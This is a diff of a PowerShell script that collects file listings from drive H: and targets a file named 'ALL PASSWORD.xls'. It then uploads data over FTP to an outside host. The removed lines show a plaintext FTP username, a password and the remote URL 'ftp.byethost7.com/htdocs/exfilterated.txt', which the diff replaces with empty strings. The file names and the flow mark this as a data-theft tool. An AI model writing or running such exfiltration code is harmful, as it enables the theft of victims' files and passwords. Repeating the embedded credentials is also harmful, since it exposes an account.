@@ -6,10 +6,10 @@ Get-Childitem "H:\" -recurse -filter "*X*.rtf" | Out-File -Append "$ScriptDir\ex
 $FilePathLIST="$ScriptDir\exfil_list_data.txt"
 $FilePathLIST_X="$ScriptDir\exfil_list_data_xii.txt"
 $FilePathpass="C:\ALL PASSWORD.xls"
-$Username = "b7_19204341"
-$Password = "wpzhj2x8"
+$Username = ""
+$Password = ""
 
-$RemoteFile = "ftp://ftp.byethost7.com/htdocs/exfilterated.txt"
+$RemoteFile = ""
 $FTPRequest = [System.Net.FtpWebRequest]::Create("$RemoteFile")
 $FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
 $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
